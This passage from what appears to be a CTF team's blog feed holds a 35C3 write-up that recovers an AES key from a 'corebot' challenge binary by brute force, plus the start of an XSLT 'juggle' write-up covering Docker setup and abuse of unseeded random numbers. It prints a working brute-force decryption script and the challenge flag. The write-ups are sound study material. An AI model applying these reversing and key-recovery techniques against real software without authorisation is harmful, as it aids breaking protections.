    <content type="html"><![CDATA[<blockquote><br>    Solves: 97<br><br>    <a href="https://35c3ctf.ccc.ac/uploads/corebot-640d3c582340e647d72e1dd9418a3fd6" target="_blank" rel="noopener">https://35c3ctf.ccc.ac/uploads/corebot-640d3c582340e647d72e1dd9418a3fd6</a><br><br>    Difficulty estimate: easy<br><br>    Guest challenge by Jesko / rattle.<br><br>    UPDATE: Challenge binary replaced. Apologies for the inconvenience.<br></blockquote><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ul><li>Identify which encryption algorithm is being used.</li><li>Extract the encrypted data from PE resources.</li><li>Brute-force the last bytes of the serial volume key.</li><li>Generate the key with the serial.</li><li>Decrypt the data and obtain the flag.</li></ul><h2 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h2><p>So we got a windows binary that uses CryptoAPI from Microsoft first thing to do is to open the binary in IDA a check the start function:<br><a data-fancybox="gallery" href="https://i.imgur.com/Gr1QEb4.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Gr1QEb4.png" alt=""><br></a><br>So after creating the key for AES the program will import the key handle following by decrypting the loaded encrypted data from the PE resources as it is explained in the image bellow:<br><a data-fancybox="gallery" href="https://i.imgur.com/9lPKuxO.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/9lPKuxO.png" alt=""><br></a><br>As I explained in the image above if you inspect the sub_11B1146 you will see it’s using the <strong>LoadResources</strong> function to <strong>extract data</strong> from the PE executable, this data happens to be the encrypted data. We can extract this data in two ways, either with dynamic analysis or with a tool to extract resources from windows binaries in my case i used <a href="https://www.systutorials.com/docs/linux/man/1-wrestool/" target="_blank" rel="noopener">wrestool</a>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ wrestool --raw -x corebot-640d3c582340e647d72e1dd9418a3fd6 | xxd</span><br><span class="line">00000000: 1029 b845 9d2a ab93 fe89 fb82 9342 a18c  .).E.*.......B..</span><br><span class="line">00000010: 2e90 6300 0611 8064 b821 c29f 35e7 7ef2  ..c....d.!..5.~.</span><br></pre></td></tr></table></figure><p>Now that we got the encrypted data we need to find a way to decrypt the data, since the key was created with challenge creator <strong>volume serial</strong> we need to brute force it, since it’s only using the lower bytes of the serial we only need to brute force two bytes.</p><p>Time to write a script to bruteforce the serial and decrypt:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_ecb_cipher</span><span class="params">(ciphertext, key)</span>:</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    plaintext = cipher.decrypt(ciphertext)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0xffff</span>+<span class="number">1</span>):</span><br><span class="line">    v5 = <span class="number">0x10</span></span><br><span class="line">    v4 = i</span><br><span class="line">    key = <span class="string">''</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        key = chr(((v4 &amp; <span class="number">0xffff</span>) &amp; <span class="number">0xff</span>)) + chr(((v4 &amp; <span class="number">0xffff</span>) &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>) + key;</span><br><span class="line">        v4 ^= ((v4 &amp; <span class="number">0xffff</span>) &gt;&gt; <span class="number">4</span>) ^ ((v4 &amp; <span class="number">0xffff</span>) &lt;&lt; <span class="number">11</span>) ^ ((v4 &amp; <span class="number">0xffff</span>) &lt;&lt; <span class="number">7</span>)</span><br><span class="line">        v5 -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> v5 == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    ciphertext = <span class="string">"\x10\x29\xb8\x45\x9d\x2a\xab\x93\xfe\x89\xfb\x82\x93\x42\xa1\x8c\x2e\x90\x63\x00\x06\x11\x80\x64\xb8\x21\xc2\x9f\x35\xe7\x7e\xf2"</span></span><br><span class="line">    message = decrypt_ecb_cipher(ciphertext, key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> message[:<span class="number">4</span>] == <span class="string">'35C3'</span>:</span><br><span class="line">        sys.stdout.write(message)</span><br><span class="line">        <span class="keyword">print</span> hex(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>Now running the script:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python corebot.py</span><br><span class="line">35C3_MalwareAuthorKryptoChef</span><br><span class="line">0x25c3</span><br></pre></td></tr></table></figure><p>The lower bytes of the serial is 0x25c3 and the respective flag was <strong>35C3_MalwareAuthorKryptoChef</strong>.</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;br&gt;    Solves: 97&lt;br&gt;&lt;br&gt;    &lt;a href=&quot;https://35c3ctf.ccc.ac/uploads/corebot-640d3c582340e647d72e1dd9418a3fd6&quot; target=&quot;_blank&quot; 
      
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="cryptoApi" scheme="https://teamrocketist.github.io/tags/cryptoApi/"/>
    
      <category term="35C3" scheme="https://teamrocketist.github.io/tags/35C3/"/>
    
      <category term="windowsBinary" scheme="https://teamrocketist.github.io/tags/windowsBinary/"/>
    
      <category term="exeResources" scheme="https://teamrocketist.github.io/tags/exeResources/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] 35C3 - juggle</title>
    <link href="https://teamrocketist.github.io/2018/12/30/Reverse-35C3-juggle/"/>
    <id>https://teamrocketist.github.io/2018/12/30/Reverse-35C3-juggle/</id>
    <published>2018-12-30T01:03:08.000Z</published>
    <updated>2018-12-31T08:25:29.507Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>    juggle 97<br><br>    Solves: 54<br><br>    Can you help this restaurant Stack the right amount of Eggs in their ML algorithms?<br><br>    Guest challenge by Tethys.<br><br>    Note that you need to send a shutdown(2) after you sent your solution. The nmap netcat will do so for you, e.g.: ncat 35.246.237.11 1 &lt; solution.xml<br><br>        /usr/bin/ncat –help | grep -n 1 Ncat 7.60 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )<br><br>    Files here: <a href="https://35c3ctf.ccc.ac/uploads/juggle-f6b6fa299ba94bbbbce2058a5ca698db.tar" target="_blank" rel="noopener">https://35c3ctf.ccc.ac/uploads/juggle-f6b6fa299ba94bbbbce2058a5ca698db.tar</a><br></blockquote><p><strong>XSL</strong> service is running in the server at a certain port, a <strong>dockerfile</strong> was provided which was cool, it helped me a lot in the debugging process, in the container environment I had no previous knowledge of <strong>xslt</strong> which took me more time in this challenge than it should.</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ul><li>The seed is not set in <strong>random</strong> so we can abuse it by doing very quick requests to get the same numbers</li><li>Identify which plate prints the flag</li><li>Use the plates in a certain order to achieve the condition necessary to print the flag</li></ul><h2 id="Walk-through"><a href="#Walk-through" class="headerlink" title="Walk-through"></a>Walk-through</h2><p>So I started by analysing the docker file, the container is using nsjail to isolate the <strong>/usr/bin/xalan</strong> service as we can see bellow:</p><h3 id="Setting-up-the-Docker-container"><a href="#Setting-up-the-Docker-container" class="headerlink" title="Setting up the Docker container"></a>Setting up the Docker container</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> tsuro/nsjail</span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get install -y xalan</span></span><br><span class="line"><span class="bash">COPY challenge.min.xslt /home/user/</span></span><br><span class="line"><span class="bash"><span class="comment">#COPY tmpflag /flag</span></span></span><br><span class="line"><span class="bash">CMD /bin/sh -c <span class="string">"/usr/bin/setup_cgroups.sh &amp;&amp; su user -c '/usr/bin/nsjail -Ml --port 1337 --chroot / --user 1000 --group 1000 --cgroup_mem_max 209715200 --cgroup_pids_max 100 --cgroup_cpu_ms_per_sec 100 --rlimit_as max --rlimit_cpu max --rlimit_nofile max --rlimit_nproc max -- /usr/bin/stdbuf -i0 -o0 -e0 /usr/bin/maybe_pow.sh /usr/bin/xalan -xsl /home/user/challenge.min.xslt'"</span></span></span><br></pre></td></tr></table></figure><p>Eventually I had to fix a line in the docker file at:<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">COPY</span><span class="bash"> challenge/challenge.min.xslt /home/user/</span></span><br></pre></td></tr></table></figure></p><p>The <strong>challenge.min.xslt</strong> was located in the root directory after extracting the files, so I ended up changing this into:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">COPY</span><span class="bash"> challenge.min.xslt /home/user/</span></span><br></pre></td></tr></table></figure><p>So lets start to build the image with <strong>docker build</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker build -t juggle .</span><br></pre></td></tr></table></figure><p>After this you can list the image created:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker image ls</span><br><span class="line">REPOSITORY                 TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">permute                    latest              1603e833509a        23 hours ago        147MB</span><br><span class="line">juggle                     latest              b4c26a022c1e        33 hours ago        205MB</span><br><span class="line">tsuro/nsjail               latest              8774d7aad732        2 days ago          156MB</span><br><span class="line">adalovelace/nodejs         latest              c2a6e42b25c8        2 days ago          63.7MB</span><br><span class="line">node                       6-alpine            c45d42c157e3        2 days ago          55.6MB</span><br><span class="line">nginx                      latest              02256cfb0e4b        2 days ago          109MB</span><br><span class="line">alpine                     latest              3f53bb00af94        8 days ago          4.41MB</span><br><span class="line">centos                     7                   1e1148e4cc2c        3 weeks ago         202MB</span><br><span class="line">postgres                   latest              f9b577fb1ed6        4 weeks ago         311MB</span><br><span class="line">thecolonial/police-quest   1.0                 0ea244849eb0        4 weeks ago         345MB</span><br><span class="line">ubuntu                     14.04               f17b6a61de28        5 weeks ago         188MB</span><br><span class="line">mysql                      latest              f991c20cb508        6 weeks ago         486MB</span><br><span class="line">httpd                      latest              2a51bb06dc8b        6 weeks ago         132MB</span><br><span class="line">debian                     latest              4879790bd60d        6 weeks ago         101MB</span><br><span class="line">seccon_pwn                 latest              3749dfe7031c        7 weeks ago         2.06GB</span><br><span class="line">skysider/pwndocker         latest              a24dde07a423        7 weeks ago         2.02GB</span><br><span class="line">elasticsearch              2                   5e9d896dc62c        3 months ago        479MB</span><br><span class="line">postgres                   9.6.2               b3b8a2229953        19 months ago       267MB</span><br><span class="line">postgres                   9.6.1               4023a747a01a        23 months ago       265MB</span><br></pre></td></tr></table></figure><p>As we can see in the list the <strong>juggle</strong> image was created (the name we gave it). </p><p>With this we can start running the container by just using <strong>docker container run</strong>:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker run -it -p 1337:1337 --name 35c3_juggle juggle bash</span><br></pre></td></tr></table></figure></p><p>After this a bash console will pop-up in the container unfortunately the command in the end of the docker didn’t work maybe something related with <strong>nsjail</strong>, I don’t know maybe I did something wrong when I was trying to connect to the service, I even tryed to rerun the command inside the container but it always gave me an error, so to not loose much time identifying it I setted up very quiclky a service with <strong>socat</strong>, <strong>socat</strong> isn’t installed in this container so I needed to install it via <strong>apt-get</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@b0927d9b031a $ socat tcp-listen:1337,fork,reuseaddr EXEC:/usr/bin/xalan -xsl /home/user/challenge.min.xslt<span class="string">'</span></span><br></pre></td></tr></table></figure><p>Since I forwarded the port 1337 from the host to the container port 1337 with the parameter <strong>-p</strong> in the <strong>docker run</strong> command. Now I could connect from the host directly to the localhost with <strong>ncat localhost 1337</strong> without getting any errors from the server.</p><h3 id="XML-format-analysis"><a href="#XML-format-analysis" class="headerlink" title="XML format analysis"></a>XML format analysis</h3><p>So it’s time to start analysing the <strong>challenge.min.xslt</strong> file, this file was minimized so I searched for an online tool to beautify to make it more readable, so lets start with the beginning:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:math</span>=<span class="string">"http://exslt.org/math"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:exsl</span>=<span class="string">"http://exslt.org/common"</span> <span class="attr">exclude-result-prefixes</span>=<span class="string">"xsl math exsl"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/meal"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">all</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:if</span> <span class="attr">test</span>=<span class="string">"count(//plate) &gt; 300"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">xsl:message</span> <span class="attr">terminate</span>=<span class="string">"yes"</span>&gt;</span>You do not have enough money to buy that much food<span class="tag">&lt;/<span class="name">xsl:message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">xsl:if</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">"chef-drinks"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"round(math:random() * 4294967296)"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"round(math:random() * 4294967296)"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"round(math:random() * 4294967296)"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"round(math:random() * 4294967296)"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"round(math:random() * 4294967296)"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">xsl:variable</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:call-template</span> <span class="attr">name</span>=<span class="string">"consume-meal"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"chef-drinks"</span> <span class="attr">select</span>=<span class="string">"exsl:node-set($chef-drinks)//value"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"food-eaten"</span> <span class="attr">select</span>=<span class="string">"1"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"course"</span> <span class="attr">select</span>=<span class="string">"course[position() = 1]/plate"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"drinks"</span> <span class="attr">select</span>=<span class="string">"state/drinks"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">xsl:call-template</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">all</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">name</span>=<span class="string">"consume-meal"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">"chef-drinks"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">"food-eaten"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">"course"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">"drinks"</span>/&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>So if you don’t know about <strong>xslt</strong> is a language that parses a xml document, and with that you can do things like converting that xml into html in a very easy way. Right at the beginning we can see what kind of structure of xml they want : </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/meal"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>The match parameter will look in the xml document from the root for a tag <strong><meal> </meal></strong>, from this you can look up into the elements inside of it. Now right after setting this an variable is declared with some <strong>random numbers</strong> (drinks), variables like in any <strong>other language</strong> are used to <strong>store</strong> values to be used later, in xslt is no different.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">"chef-drinks"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">"chef-drinks"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"round(math:random() * 4294967296)"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"round(math:random() * 4294967296)"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"round(math:random() * 4294967296)"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"round(math:random() * 4294967296)"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"round(math:random() * 4294967296)"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:variable</span>&gt;</span></span><br></pre></td></tr></table></figure><p>This random implementation looks already suspicious, looks it it doesn’t even have any kind of seed, and if it has a seed it probably is the current time. Now right after declaring this drinks with random numbers it does a <strong>template</strong> call as you can see bellow:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:call-template</span> <span class="attr">name</span>=<span class="string">"consume-meal"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"chef-drinks"</span> <span class="attr">select</span>=<span class="string">"exsl:node-set($chef-drinks)//value"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"food-eaten"</span> <span class="attr">select</span>=<span class="string">"1"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"course"</span> <span class="attr">select</span>=<span class="string">"course[position() = 1]/plate"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"drinks"</span> <span class="attr">select</span>=<span class="string">"state/drinks"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:call-template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>You can think of this like it’s a function call in a <strong>normal language</strong>, the name of the function is <strong>consume-meal</strong> and its arguments are right below, the declaration of <strong>consume-meal</strong> is just below this code, but before doing that lets analyse the <strong>selects</strong> for the arguments since they give us hints about how the <strong>xml</strong> document should be built. </p><p>So for the first parameter:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"chef-drinks"</span> <span class="attr">select</span>=<span class="string">"exsl:node-set($chef-drinks)//value"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>so <strong>exsl:node-set</strong> will just grab all the values from the variable <strong>$chef-drinks</strong> and pass it into the function as it was an array, explaining the <strong>//value</strong> part, the first <strong>/</strong> is referencing the the tag of the variable <strong>&lt;xsl:variable name=”chef-drinks”&gt;</strong> and the <strong>/value</strong> is referencing to the <strong>\&lt;value></strong> tag, this extracts the variable random number drinks and sets them as an array to be used in the template “function”. </p><p>So for the second parameter:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"food-eaten"</span> <span class="attr">select</span>=<span class="string">"1"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>The <strong>food-eaten</strong> parameter is initialized into 1 and this an integer variable that ill keep track of the number of plates you consume, after analysing <strong>consume-meal</strong> you will see that there’s a limit of plates you can eat that’s why they are tracking this number here.</p><p>So for the third parameter:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"course"</span> <span class="attr">select</span>=<span class="string">"course[position() = 1]/plate"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>Since we are inside a template tag <strong>match</strong> meal, by analysing this select it looks it inside the tag meal, our xml will need to have a <strong>course</strong> tag (\&lt;course>) and plate tags inside of it, this works like a hierarchy from the left to right, the part <strong>[position() = 1]</strong> is just selecting the first plate inside the <strong>course</strong> tag, an example xml could be like this:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meal</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">course</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line">                    1st plate</span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line">                    2nd plate</span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">course</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">meal</span>&gt;</span></span><br></pre></td></tr></table></figure><p>So <strong>course[position() = 1]</strong> will select the first plate inside <strong>course</strong> so the parameter <strong>course</strong> will be set into : </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line">  1st plate</span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br></pre></td></tr></table></figure><p>So for the fourth parameter:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"drinks"</span> <span class="attr">select</span>=<span class="string">"state/drinks"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>Once again this will select all the drinks declared inside <strong>state</strong> and <strong>drinks</strong> tags, so two new tags will needed to be added inside <strong>meal</strong> tag. </p><p>Based on the information we have now an example xml can be build like this:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 